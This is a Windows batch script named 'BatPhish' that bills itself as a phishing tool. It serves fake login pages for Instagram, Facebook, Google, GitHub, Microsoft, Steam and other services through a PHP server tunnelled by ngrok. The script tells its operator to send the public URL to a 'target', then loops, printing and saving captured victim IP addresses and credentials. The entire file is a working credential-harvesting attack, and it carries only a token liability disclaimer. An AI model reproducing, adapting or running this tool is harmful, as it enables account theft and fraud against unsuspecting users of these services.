@echo off
color 02
title BatPhish by @pranavbhuchhada
call :banner
call :checkdependencies
call :menu
call :start_php_server
ping 127.0.0.1>nul
REM ping 127.0.0.1>nul
call :start_ngrok_server
REM ping 127.0.0.1>nul
call :checkfound
exit /b 0


:checkdependencies
( php -version 1> nul 2>nul) || ( 
    echo I require php but it's not installed. Install it or Ensure php is added to system PATH.
    echo Aborting.
    exit
)
( ngrok -version 1> nul 2>nul ) || ( 
    echo I require ngrok but it's not installed.
    call :install_ngrok
)
exit /b 0 


:checkfound
echo Waiting IPs and Credentials. Close this window to stop and exit.
:while
if exist sites\%server%\ip.txt (
    color 04
    echo IP Found!
    type sites\%server%\ip.txt && echo.
    type sites\%server%\ip.txt >> sites\%server%\saved.ip.txt && echo.
    del sites\%server%\ip.txt
)
if exist sites\%server%\usernames.txt (
    color 04
    echo Credentials Found!
    type sites\%server%\usernames.txt && echo.
    type sites\%server%\usernames.txt >> sites\%server%\saved.usernames.txt && echo.
    del sites\%server%\usernames.txt
)
ping 127.0.0.1>nul
ping 127.0.0.1>nul
color 02
goto while
exit /b 0


:start_php_server
echo Starting php server
start /b php -t sites\%server% -S 127.0.0.1:3333 1>nul 2>nul
echo php server running at 127.0.0.1:3333
exit /b 0


:start_ngrok_server
echo Starting ngrok server
start /b ngrok http 3333 1>nul 2>nul
ping 127.0.0.1 > nul
ping 127.0.0.1 > nul
echo Send the following url to target
php get_url.php
echo.
exit /b 0


:menu
echo     [1] Instagram    [9] Origin             [17] GitLab
echo     [2] Facebook     [10] Steam             [18] Pinterest
echo     [3] Snapchat     [11] Yahoo             [19] create
echo     [4] Twitter      [12] LinkedIn          [99] Exit
echo     [5] GitHub       [13] Protonmail        
echo     [6] Google       [14] WordPress         
echo     [7] Spotify      [15] Microsoft         
echo     [8] Netflix      [16] InstaFollowers    
echo     [9] Origin
echo.
echo.

:top
set /p option="Choose an option: "
if %option% == 1 ( set server=instagram)
if %option% == 2 ( set server=facebook)
if %option% == 3 ( set server=snapchat)
if %option% == 4 ( set server=twitter)
if %option% == 5 ( set server=github)
if %option% == 6 ( set server=google)
if %option% == 7 ( set server=spotify)
if %option% == 8 ( set server=netflix)
if %option% == 9 ( set server=origin)
if %option% == 10 ( set server=steam)
if %option% == 11 ( set server=yahoo)
if %option% == 12 ( set server=linkedin)
if %option% == 13 ( set server=protonmail)
if %option% == 14 ( set server=wordpress)
if %option% == 15 ( set server=microsoft)
if %option% == 16 ( set server=instafollowers)
if %option% == 17 ( set server=gitlab)
if %option% == 18 ( set server=pinterest)
if %option% == 19 ( set server=create)
if %option% == 99 ( exit ) else ( 
    IF NOT DEFINED server (
        echo Invaild Option
        goto top
    )
)
exit /b 0


:install_ngrok
echo Installing Ngrok. Please Wait...
REM  curl -s -N https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip --output ngrok.zip
curl -s -N https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-386.zip --output ngrok.zip
tar -xf ngrok.zip
del ngrok.zip
echo ngrok installled
echo .
echo .
exit /b 0


:banner
echo                 ____        _   ____  _     _     _      
echo                ^| __ )  __ _^| ^|_^|  _ \^| ^|__ (_)___^| ^|__  
echo                ^|  _ \ / _` ^| __^| ^|_) ^| '_ \^| / __^| '_ \ 
echo                ^| ^|_) ^| (_^| ^| ^|_^|  __/^| ^| ^| ^| \__ \ ^| ^| ^|
echo                ^|____/ \__,_^|\__^|_^|   ^|_^| ^|_^|_^|___/_^| ^|_^|
echo.
echo          :::::: Phishing tool coded by @pranavbhuchhada ::::::
echo.
echo.
echo :: Disclaimer: Developer assume no liability and are not responsible ::
echo ::         for any misuse or damage caused by BatPhish               :: 
echo.
echo.

exit /b 0